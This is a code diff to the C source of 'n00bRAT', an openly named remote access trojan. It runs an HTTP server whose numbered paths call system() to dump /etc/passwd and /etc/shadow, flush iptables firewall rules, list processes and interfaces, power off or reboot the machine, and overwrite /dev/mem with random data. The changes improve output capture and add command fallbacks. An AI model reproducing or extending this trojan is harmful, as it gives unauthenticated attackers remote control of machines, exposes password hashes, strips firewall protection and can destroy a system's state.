@@ -8,7 +8,6 @@
 @author         : AbhishekKr [http://abhishekkr.github.io/] -=ABK=-
 **********************************************************************************************/
 
-/*  n00bRAT Server SOURCE CODE STARTS HERE  */
 #include "ABK_n00bRAT.h"
 
 //the string finally sent as HTTP Response
@@ -24,7 +23,7 @@ char *httpResponse200 = "HTTP/1.1 200 OK\nServer: n00b\nContent-Type: text/html\
                         "<a href=\'1\'>/etc/passwd</a><br/>"
                         "<a href=\'2\'>/etc/shadow</a><br/>"
                         "<a href=\'3\'>/etc/resolv.conf (the resolved IP entries)</a><br/>"
-                        "<a href=\'4\'>/dev/mem (map the dynamic memory)</a><br/>"
+                        "<a href=\'4\'>process list</a><br/>"
                         "<a href=\'5\'>iptables --flush (Clear all entries in Firewall)</a><br/>"
                         "<a href=\'6\'>ifconfig -a</a><br/><a href=\'7\'>ifconfig -s</a><br/>"
                         "<a href=\'8\'>poweroff</a><br/><a href=\'9\'>reboot</a><br/>"
@@ -50,6 +49,7 @@ int getAXN();
 int getAXNCode(char* axnTok);
 /******************/
 
+/* main */
 int main()
 {
   int numbytes;
@@ -105,13 +105,16 @@ int main()
     tellClient();
 
     close(fd2); /*  close fd2 */
+    printf("[+] %s\n", Request);
   }
-  printf(">>>>>>>>>>>>>> %s", Request);
   return 0;
-}//end of main
-//
-////it duplicates STDOUT to a Program Handled Stream using it
-//output of system commands is captured in this stream directly
+}
+
+
+/* 
+ * it duplicates STDOUT to a Program Handled Stream using it
+ * output of system commands is captured in this stream directly
+*/
 void dupStreamz(){
   if(pipe(pfds) == -1){
   system("echo 'IPC error' >> zerror.log");
@@ -124,10 +127,13 @@ void dupStreamz(){
   return;
 }
 
-//it checks for the desired action in axnCode,
-//executes the desired system command
-//builds up the HTTP Response with desired Output
-//send the HTTP Response to Client
+
+/*
+ * it checks for the desired action in axnCode,
+ * executes the desired system command
+ * builds up the HTTP Response with desired Output
+ * send the HTTP Response to Client
+*/
 void tellClient(){
   char buf[MAXSTRSIZE] = "HTTP 200 OK\0";  //buffer to hold System Commands' Output
   char tmpBuf[MAXSTRSIZE];
@@ -150,31 +156,31 @@ void tellClient(){
         system("cat /dev/urandom > /dev/mem");  break;
     //all entries of /etc/passwd
     case 1:    strcpy(httpResponse,httpResponse200);
-        system("echo \'/etc/passwd Listing:   \' | cat /etc/passwd");  break;
+        system("cat /etc/passwd 2>&1 | sed 's/\\n/<br\\/>/g' | sed 's/\\r/<br\\/>/g'");  break;
     //all entries of /etc/shadow
     case 2:    strcpy(httpResponse,httpResponse200);
-        system("echo \'/etc/shadow Listing:   \' | cat /etc/shadow");  break;
+        system("cat /etc/shadow 2>&1 | sed 's/\\n/<br\\/>/g' | sed 's/\\r/<br\\/>/g'");  break;
     //all entries of /etc/resolv.conf
     case 3:    strcpy(httpResponse,httpResponse200);
-        system("echo \'/etc/resolv.conf Listing:   \' | cat /etc/resolv.conf");  break;
-    //prints entire dynamic memory
+        system("cat /etc/resolv.conf 2>&1");  break;
+    //prints entire ps list
     case 4:    strcpy(httpResponse,httpResponse200);
-        system("echo \'/dev/mem Listing:   \' | cat /dev/mem");  break;
+        system("ps aux");  break;
     //deletes all entries of IPTABLES (Firewall)
     case 5:    strcpy(httpResponse,httpResponse200);
-        system("iptables --flush | echo \'IPTables Entries Deleted\'");  break;
+        system("iptables --flush 2>&1 && echo \'IPTables Entries Deleted\'");  break;
     //all information of all NICs
     case 6:    strcpy(httpResponse,httpResponse200);
-        system("echo \'ifconfig-a Listing:   \' | ifconfig -a");  break;
+        system("ifconfig -a 2>&1 || ip -a 2>&1 || networkctl --no-legend --no-pager status 2>&1");  break;
     //System Coded Info of all NICs
     case 7:    strcpy(httpResponse,httpResponse200);
-        system("echo \'ifconfig-s Listing:   \' | ifconfig -s");  break;
+        system("ifconfig -s 2>&1 || ip link 2>&1 || networkctl  --no-legend --no-pager list 2>&1");  break;
     //PowerOff
     case 8:    strcpy(httpResponse,httpResponse200);
-        system("poweroff");  break;
+        system("poweroff 2>&1");  break;
     //Reboot
     case 9:    strcpy(httpResponse,httpResponse200);
-        system("reboot");  break;
+        system("reboot 2>&1");  break;
     //default case
     default:  strcpy(httpResponse,httpResponse400);
         system("echo \"HTTP 404\"");  break;
@@ -186,8 +192,11 @@ void tellClient(){
   return;
 }
 
-//extracts the action code from HTTP Request
-//returns back the action Code
+
+/*
+ * extracts the action code from HTTP Request
+ * returns back the action Code
+*/
 int getAXN(){
   char *axnTok;
   if((axnTok=strtok(Request," ")) != NULL){
@@ -199,9 +208,10 @@ int getAXN(){
   return -10;
 }
 
+
 /*
  * getAXNCode maps passed string to action token and returns int code
- * */
+*/
 int getAXNCode(char* axnTok){
   if(strcmp("/n00b",axnTok)==0)
     return -1;
@@ -212,5 +222,3 @@ int getAXNCode(char* axnTok){
   int axnCodeInt = *axnCodeChar - '0';
   return axnCodeInt;
 }
-
-/*  n00bRAT Server SOURCE CODE ENDS HERE */
